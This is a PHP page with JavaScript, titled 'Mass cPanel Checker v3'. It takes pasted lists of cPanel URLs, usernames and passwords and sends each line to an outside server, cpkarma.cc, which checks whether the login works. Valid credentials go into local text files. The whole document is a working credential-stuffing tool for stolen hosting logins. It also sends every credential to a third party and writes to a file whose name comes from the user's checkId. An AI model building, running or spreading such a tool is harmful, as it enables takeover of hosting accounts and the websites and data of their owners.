<?php
error_reporting(0);
header('Content-Type: text/html; charset=UTF-8');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['validResult'])) {
    header('Content-Type: application/json');
    $validResult = $_POST['validResult'];
    $checkId = isset($_POST['checkId']) ? $_POST['checkId'] : null;
    
    if ($checkId) {
        $filePath = "v3-{$checkId}.txt";
    } else {
        $randomString = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 8);
        $filePath = "v3-{$randomString}.txt";
    }
    
    $response = ['success' => false];
    try {
        $result = file_put_contents($filePath, $validResult . PHP_EOL, FILE_APPEND | LOCK_EX);
        if ($result !== false) {
            $response['success'] = true;
        }
    } catch (Exception $e) {
    }
    echo json_encode($response);
    exit;
}

$apiUrl = 'http://cpkarma.cc/cpv3/api.php';
$saveUrl = $_SERVER['PHP_SELF'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>cPanel Checker v3</title>
    <style>
        :root {
            --primary: #2c3e50;
            --secondary: #3498db;
            --success: #27ae60;
            --error: #e74c3c;
            --background: #ecf0f1;
            --card-bg: #ffffff;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: var(--background);
            color: var(--primary);
            line-height: 1.6;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: var(--primary);
            font-size: 1.5em;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .form-container {
            background: var(--card-bg);
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 30px;
            transition: transform 0.3s ease;
        }
        .form-container:hover {
            transform: translateY(-5px);
        }
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: var(--primary);
        }
        textarea {
            width: 100%;
            height: 200px;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            resize: vertical;
            font-size: 1em;
            transition: border-color 0.3s ease;
        }
        textarea:focus {
            outline: none;
            border-color: var(--secondary);
        }
        button {
            background: linear-gradient(135deg, #6e8efb, #a777e3);
            color: #ffffff;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: 600;
            margin-top: 15px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(110, 142, 251, 0.3);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        button:hover {
            background: linear-gradient(135deg, #a777e3, #6e8efb);
            transform: translateY(-2px) scale(1.05);
            box-shadow: 0 6px 20px rgba(110, 142, 251, 0.5);
        }
        button:active {
            transform: scale(0.98);
            box-shadow: 0 2px 10px rgba(110, 142, 251, 0.2);
        }
        button#stopButton {
            background: linear-gradient(135deg, #ff6b6b, #ff4757);
            margin-left: 10px;
        }
        button#stopButton:hover {
            background: linear-gradient(135deg, #ff4757, #ff6b6b);
            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.5);
        }
        button#showValidButton {
            background: linear-gradient(135deg, #2ecc71, #27ae60);
            display: none;
            margin: 10px auto;
        }
        button#showValidButton:hover {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
            box-shadow: 0 6px 20px rgba(46, 204, 113, 0.5);
        }
        .result {
            background: var(--card-bg);
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .result h3 {
            color: var(--primary);
            margin-bottom: 10px;
            font-size: 1.0em;
        }
        #results p {
            background: #f9f9f9;
            padding: 10px 15px;
            margin: 10px 0;
            border-radius: 5px;
            border-left: 4px solid var(--secondary);
            animation: fadeIn 0.5s ease;
        }
        .success {
            color: var(--success);
            font-weight: 600;
        }
        .error {
            color: var(--error);
            font-weight: 600;
        }
        #stats {
            font-weight: 600;
            margin: 10px 0;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @media (max-width: 600px) {
            .form-container, .result {
                padding: 15px;
            }
        }
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .popup-content {
            background: var(--card-bg);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            width: 90%;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            animation: slideIn 0.3s ease;
        }
        .popup-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            border-bottom: 2px solid var(--secondary);
            padding-bottom: 10px;
        }
        .popup-header h3 {
            color: var(--primary);
            font-size: 1.2em;
        }
        .close-btn {
            background: none;
            border: none;
            font-size: 1.5em;
            color: var(--error);
            cursor: pointer;
            padding: 0 5px;
        }
        .valid-textarea {
            width: 100%;
            min-height: 200px;
            padding: 15px;
            border: 2px solid var(--success);
            border-radius: 8px;
            resize: vertical;
            font-size: 1em;
            background: #f0fff0;
            color: var(--primary);
            font-family: 'Courier New', monospace;
        }
        @keyframes slideIn {
            from { transform: translateY(-50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Mass cPanel Checker v3</h1>
        <div class="form-container">
            <form id="cpanelForm">
                <label for="cpv3">Enter cPanel Credentials (one per line):</label>
                <textarea name="cpv3" id="cpv3" placeholder="https://domain1.com:2083|username1|password1
https://domain2.com:2083|username2|password2
https://domain3.com:2083|username3|password3" rows="3" required></textarea>
                <center>
                    <button type="submit" id="checkButton">Check cPanels</button>
                    <button type="button" id="stopButton" style="display: none;">Stop Checking</button>
                </center>
            </form>
        </div>
        <div class="result">
            <h3>Results:</h3>
            <div id="stats"></div>
            <div id="results"></div>
            <center><button id="showValidButton">Show Valid Results</button></center>
        </div>
    </div>

    <div class="popup-overlay" id="validPopup">
        <div class="popup-content">
            <div class="popup-header">
                <h3>Valid cPanel Credentials</h3>
                <button class="close-btn" id="closePopup">×</button>
            </div>
            <textarea class="valid-textarea" id="validResults" readonly></textarea>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('cpanelForm');
            const checkButton = document.getElementById('checkButton');
            const stopButton = document.getElementById('stopButton');
            const popup = document.getElementById('validPopup');
            const closePopup = document.getElementById('closePopup');
            const validResultsTextarea = document.getElementById('validResults');
            const showValidButton = document.getElementById('showValidButton');
            const maxResults = 10;
            let validCount = 0;
            let invalidCount = 0;
            let shouldStop = false;
            let validCredentials = [];
            let currentCheckId = null;

            closePopup.addEventListener('click', function() {
                popup.style.display = 'none';
                if (validCredentials.length > 0) {
                    showValidButton.style.display = 'block';
                }
            });

            popup.addEventListener('click', function(e) {
                if (e.target === popup) {
                    popup.style.display = 'none';
                    if (validCredentials.length > 0) {
                        showValidButton.style.display = 'block';
                    }
                }
            });

            showValidButton.addEventListener('click', function() {
                if (validCredentials.length > 0) {
                    validResultsTextarea.value = validCredentials.join('\n');
                    popup.style.display = 'flex';
                    showValidButton.style.display = 'none';
                }
            });

            stopButton.addEventListener('click', function() {
                shouldStop = true;
                stopButton.style.display = 'none';
                checkButton.disabled = false;
                showValidResults();
                const resultsDiv = document.getElementById('results');
                const completedElement = document.createElement('p');
                completedElement.innerHTML = `<p style="font-size: 1.2rem; color: #333; font-weight: 600; background: linear-gradient(90deg, #f8f8f8, #eaeaea); padding: 12px; border-radius: 8px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1); text-align: center;">⛔ Task Stopped</p>`;
                resultsDiv.appendChild(completedElement);
            });

            form.addEventListener('submit', async function(event) {
                event.preventDefault();
                const cpv3Input = document.getElementById('cpv3').value.trim();
                const cpv3List = cpv3Input.split('\n').map(line => line.trim()).filter(line => line);
                const resultsDiv = document.getElementById('results');
                const statsDiv = document.getElementById('stats');
                const totalTools = cpv3List.length;
                validCount = 0;
                invalidCount = 0;
                shouldStop = false;
                validCredentials = [];
                showValidButton.style.display = 'none';
                
                currentCheckId = Math.random().toString(36).substr(2, 8);

                resultsDiv.innerHTML = `
                    <p style="font-size: 1.2rem; color: #333; font-weight: 600; background: linear-gradient(90deg, #f8f8f8, #eaeaea); padding: 12px; border-radius: 8px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1); text-align: center;">⚙ Task Started</p>
                    <p style="color: var(--secondary); font-weight: 600; text-align: center;">${totalTools} cPanel Loaded</p>
                `;
                statsDiv.innerHTML = `<span style="color: var(--success);">Valid: ${validCount}</span> <span style="color: var(--error);">Invalid: ${invalidCount}</span>`;
                checkButton.disabled = true;
                stopButton.style.display = 'inline-block';

                if (cpv3List.length === 0) {
                    resultsDiv.innerHTML += '<p class="error">Error: No valid credentials provided</p>';
                    checkButton.disabled = false;
                    stopButton.style.display = 'none';
                    return;
                }

                let currentIndex = 1;
                for (const cpv3 of cpv3List) {
                    if (shouldStop) break;
                    try {
                        const formData = new FormData();
                        formData.append('cpv3', cpv3);
                        const response = await fetch('<?php echo $apiUrl; ?>', {
                            method: 'POST',
                            body: formData,
                            headers: { 'Accept': 'application/json' }
                        });
                        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                        const result = await response.json();
                        const resultElement = document.createElement('p');
                        if (!result || typeof result !== 'object') {
                            resultElement.innerHTML = `<span class="error">Error for ${escapeHtml(cpv3)}: Invalid API response format</span>`;
                            invalidCount++;
                        } else if (result.error) {
                            resultElement.innerHTML = `<span class="error">Error for ${escapeHtml(cpv3)}: ${escapeHtml(result.error)}</span>`;
                            invalidCount++;
                        } else {
                            resultElement.innerHTML = `<span style="font-size: 1rem; font-weight: bold; background: linear-gradient(90deg, #ff7b00, #ff4d00); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">cPanel (${currentIndex}/${totalTools}) →</span>
                                ${escapeHtml(result.input || cpv3)}<br>` +
                                `<span class="${result.status === 'working' ? 'success' : 'error'}">Status: ${result.status === 'working' ? 'Valid' : 'Invalid'}</span>`;
                            if (result.status === 'working') {
                                validCount++;
                                validCredentials.push(result.input || cpv3);
                                const saveData = new FormData();
                                saveData.append('validResult', result.input || cpv3);
                                saveData.append('checkId', currentCheckId);
                                try {
                                    const saveResponse = await fetch('<?php echo $saveUrl; ?>', {
                                        method: 'POST',
                                        body: saveData
                                    });
                                    await saveResponse.json();
                                } catch (error) {
                                }
                            } else {
                                invalidCount++;
                            }
                        }
                        resultsDiv.appendChild(resultElement);
                        const allResults = resultsDiv.getElementsByTagName('p');
                        while (allResults.length > maxResults + 2) {
                            resultsDiv.removeChild(allResults[2]);
                        }
                        statsDiv.innerHTML = `<span style="color: var(--success);">Valid: ${validCount}</span> <span style="color: var(--error);">Invalid: ${invalidCount}</span>`;
                    } catch (error) {
                        const errorElement = document.createElement('p');
                        errorElement.innerHTML = `<span class="error">Error for ${escapeHtml(cpv3)}: ${escapeHtml(error.message)}</span>`;
                        resultsDiv.appendChild(errorElement);
                        invalidCount++;
                        const allResults = resultsDiv.getElementsByTagName('p');
                        while (allResults.length > maxResults + 2) {
                            resultsDiv.removeChild(allResults[2]);
                        }
                        statsDiv.innerHTML = `<span style="color: var(--success);">Valid: ${validCount}</span> <span style="color: var(--error);">Invalid: ${invalidCount}</span>`;
                    }
                    currentIndex++;
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }

                if (!shouldStop) {
                    const completedElement = document.createElement('p');
                    completedElement.innerHTML = `<p style="font-size: 1.2rem; color: #333; font-weight: 600; background: linear-gradient(90deg, #f8f8f8, #eaeaea); padding: 12px; border-radius: 8px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1); text-align: center;">✓ Completed</p>`;
                    resultsDiv.appendChild(completedElement);
                    showValidResults();
                }

                checkButton.disabled = false;
                stopButton.style.display = 'none';
            });

            function showValidResults() {
                if (validCredentials.length > 0) {
                    validResultsTextarea.value = validCredentials.join('\n');
                    popup.style.display = 'flex';
                } else {
                    const resultsDiv = document.getElementById('results');
                    resultsDiv.innerHTML += '<p class="error">No valid credentials found</p>';
                }
            }

            function escapeHtml(unsafe) {
                if (typeof unsafe !== 'string') return '';
                return unsafe
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;")
                    .replace(/"/g, "&quot;")
                    .replace(/'/g, "&#039;");
            }
        });
    </script>
</body>
</html>
